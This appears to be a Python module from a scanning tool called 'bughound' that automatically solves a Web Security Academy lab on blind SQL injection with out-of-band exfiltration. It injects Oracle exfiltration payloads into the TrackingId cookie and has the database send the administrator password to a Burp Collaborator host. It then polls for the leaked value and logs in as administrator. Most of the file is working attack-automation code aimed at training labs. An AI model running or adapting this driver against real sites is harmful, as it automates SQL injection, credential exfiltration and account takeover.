"""Golden-path solvers: minimal, fully-logged live-lab drivers.

Why this exists: seven real-instance failures produced ZERO diagnostics --
full pipeline scans are long, and a mid-flight lab death (or a context loss)
left nothing on disk. The golden drivers invert that:

  * FAST   -- no crawl, no phases, no pipeline: check -> fire -> poll -> login
              -> verify, ~2 minutes end-to-end on a live instance;
  * LOUD   -- every HTTP request/response, every poll round, every decision
              is appended to a JSONL log (flush per line) under ``reports/``
              so a mid-flight death still leaves a complete trace;
  * STANDALONE -- raw httpx + this package's pure functions (Collaborator
              KDF, payload builders, lab-banner detection). No ScanContext.

CLI: ``python -m bughound golden <url>``.
Exit codes: 0 solved | 1 already solved | 2 not solved (see log) | 3 dead/env.
"""
from __future__ import annotations

import datetime
import json
import pathlib
import re
import time

import httpx

from .oob import (
    ADMIN_PASSWORD_SQL,
    CollaboratorClient,
    decode_hex_value,
    encode_cookie_value,
    exfil_value_from_interaction,
    oracle_oob_exfil_union,
    oracle_oob_exfil_utl,
    oracle_oob_exfil_xml,
)
from .solving import detect_lab_html

LOGF = None


def _log(kind: str, **data) -> None:
    rec = {"t": round(time.time(), 3), "kind": kind, **data}
    line = json.dumps(rec, default=str)
    if LOGF is not None:
        LOGF.write(line + "\n")
        LOGF.flush()
    print(line, flush=True)


def _bare_get(url: str, cookie_hdr: str | None = None) -> httpx.Response:
    """One-shot jar-less GET: the ONLY cookies sent are the ones we pass.

    httpx auto-captures Set-Cookie into the client jar, which silently
    consumes the lab's one-time TrackingId issue -- so every probe runs on a
    throwaway client and cookies are managed explicitly.
    """
    headers = {"Cookie": cookie_hdr} if cookie_hdr else None
    with httpx.Client(timeout=20.0, http2=False, verify=False) as c:
        r = c.get(url, headers=headers)
    _log("http", method="GET", url=url, status=r.status_code,
         set_cookie=r.headers.get_list("set-cookie"),
         body_head=r.text[:240])
    return r


def _parse_cookies(r: httpx.Response) -> dict[str, str]:
    out: dict[str, str] = {}
    for sc in r.headers.get_list("set-cookie"):
        first = sc.split(";", 1)[0]
        if "=" in first:
            n, v = first.split("=", 1)
            out[n.strip()] = v.strip()
    return out


def _lab_status(base: str) -> tuple[str, bool | None]:
    try:
        r = _bare_get(base)
    except Exception as exc:  # noqa: BLE001
        _log("error", where="lab_status", exc=repr(exc))
        return "", None
    lab = detect_lab_html(r.text) or {}
    return (lab.get("title") or ""), lab.get("solved")


def _parse_csrf(html: str) -> str | None:
    for m in re.finditer(r"<input\b[^>]*>", html):
        tag = m.group(0)
        if re.search(r'name=["\']?csrf["\']?', tag):
            v = re.search(r'value=["\']([^"\']*)["\']', tag)
            if v:
                return v.group(1)
            v2 = re.search(r'value=([^\s>]+)', tag)
            if v2:
                return v2.group(1)
    return None


def _fire_cookie(base: str, cookies: dict, cname: str,
                 payload: str) -> httpx.Response:
    """GET the seed page with the captured cookies replayed and ``cname``
    swapped for the payload -- cookie values percent-encoded EXACTLY ONCE (a
    raw '%' breaks the Academy's server-side URL decoding before SQL)."""
    jar = dict(cookies)
    jar[cname] = encode_cookie_value(payload)
    hdr = "; ".join(f"{k}={v}" for k, v in jar.items())
    return _bare_get(base, cookie_hdr=hdr)


def _poll_values(cc: CollaboratorClient, deadline_s: float = 90.0,
                 interval: float = 5.0) -> list[str]:
    """Patiently poll the Collaborator; log EVERY round (even empty)."""
    end = time.time() + deadline_s
    rnd = 0
    while time.time() < end:
        rnd += 1
        try:
            its = cc.poll()
        except Exception as exc:  # noqa: BLE001
            its = []
            _log("poll-error", round=rnd, exc=repr(exc))
        vals: list[str] = []
        for it in its:
            _log("interaction", full_id=it.get("full-id"),
                 protocol=it.get("protocol"), client=it.get("remote-address"))
            v = exfil_value_from_interaction(it)
            if v:
                vals.append(v)
        _log("poll", round=rnd, interactions=len(its), values=vals,
             remaining_s=round(end - time.time(), 1))
        if vals:
            return vals
        time.sleep(interval)
    return []


def _login(base: str, username: str, password: str) -> tuple[bool, str]:
    cl = httpx.Client(timeout=20.0, http2=False, verify=False)
    try:
        r = cl.get(base.rstrip("/") + "/login")
        csrf = _parse_csrf(r.text)
        if not csrf:
            return False, "no csrf token on login page"
        r2 = cl.post(base.rstrip("/") + "/login",
                     data={"csrf": csrf, "username": username,
                           "password": password})
        loc = r2.headers.get("location", "")
        ok = r2.status_code in (301, 302, 303) and "login" not in loc
        if ok:
            r3 = cl.get(base.rstrip("/") + "/my-account")
            ok = r3.status_code == 200 and username in r3.text
            return ok, f"302->{loc} my-account={r3.status_code}"
        return False, f"status={r2.status_code} loc={loc}"
    except Exception as exc:  # noqa: BLE001
        return False, repr(exc)
    finally:
        cl.close()


def golden_exfil(url: str, out_dir: str = "reports") -> int:
    """Golden path for 'Blind SQL injection with out-of-band data
    exfiltration': fire the official exfil ladder through the Burp
    Collaborator public server, read the password back, log in as
    administrator, verify the platform banner. Returns the exit code."""
    global LOGF
    host = url.split("//", 1)[-1].split("/")[0]
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    path = pathlib.Path(out_dir) / f"golden-{host}-{ts}.jsonl"
    path.parent.mkdir(parents=True, exist_ok=True)
    LOGF = path.open("a")
    _log("start", url=url, log=str(path))

    # 0. alive + already-solved guard
    title, solved = _lab_status(url)
    _log("lab", title=title, solved=solved)
    if not title:
        _log("verdict", result="DEAD-OR-NOT-A-LAB",
             reason="no lab banner; instance likely expired (gateway 504)")
        return 3
    if solved is True:
        _log("verdict", result="ALREADY-SOLVED", title=title)
        return 1

    # 1. capture the cookie issue exactly as the lab hands it out
    try:
        r = _bare_get(url)
    except Exception as exc:  # noqa: BLE001
        _log("verdict", result="DEAD-MID-RUN", reason=repr(exc))
        return 3
    cookies = _parse_cookies(r)
    _log("cookies", cookies=cookies)
    if not cookies:
        _log("verdict", result="NO-COOKIES",
             reason="lab issued no cookies; unknown injection surface")
        return 2

    # 2. OOB channel (Burp Collaborator public server)
    cc = CollaboratorClient()
    ok = cc.available()
    _log("collab", available=ok, biid=cc.biid)
    if not ok:
        _log("verdict", result="CHANNEL-DOWN",
             reason="polling.burpcollaborator.net unreachable")
        return 2

    # 3. fire the full exfil ladder on the cookie injection points
    targets = ([c for c in cookies if c.lower() == "trackingid"]
               or list(cookies))[:2]
    ladder = [
        ("union-xml", lambda h: oracle_oob_exfil_union(h, ADMIN_PASSWORD_SQL)),
        ("utl", lambda h: oracle_oob_exfil_utl(h, ADMIN_PASSWORD_SQL)),
        ("xml", lambda h: oracle_oob_exfil_xml(h, ADMIN_PASSWORD_SQL)),
        ("hex", lambda h: oracle_oob_exfil_utl(
            h, f"RAWTOHEX(({ADMIN_PASSWORD_SQL}))")),
    ]
    fired: list[tuple[str, str, str]] = []
    for cname in targets:
        for mode, build in ladder:
            oob_host = cc.interaction_host("exf")
            payload = build(oob_host)
            try:
                resp = _fire_cookie(url, cookies, cname, payload)
                _log("fire", cookie=cname, mode=mode, host=oob_host,
                     status=resp.status_code)
                fired.append((cname, oob_host, mode))
            except Exception as exc:  # noqa: BLE001
                _log("fire-error", cookie=cname, mode=mode, exc=repr(exc))

    # 4. read the channel back
    values = _poll_values(cc)
    if not values:
        _log("verdict", result="NOT-SOLVED",
             reason=f"no exfiltrated interaction after {len(fired)} payloads; "
                    f"fired={[f[2] for f in fired]}")
        cc.close()
        return 2
    cc.close()
    _log("exfil", raw_values=values)

    # 5. use the exfiltrated credential
    login_ok = False
    for raw in values[:3]:
        pwd = raw
        if not (2 <= len(raw) <= 32):
            hexed = decode_hex_value(raw)
            if hexed:
                pwd = hexed
        login_ok, detail = _login(url, "administrator", pwd)
        _log("login", user="administrator", ok=login_ok, detail=detail,
             pwd_len=len(pwd))
        if login_ok:
            break

    # 6. final verdict from the platform banner
    time.sleep(3)
    _t2, solved2 = _lab_status(url)
    _log("verdict", result="SOLVED" if solved2 else "NOT-SOLVED",
         banner_solved=solved2, login_ok=login_ok, title=_t2)
    return 0 if solved2 else 2
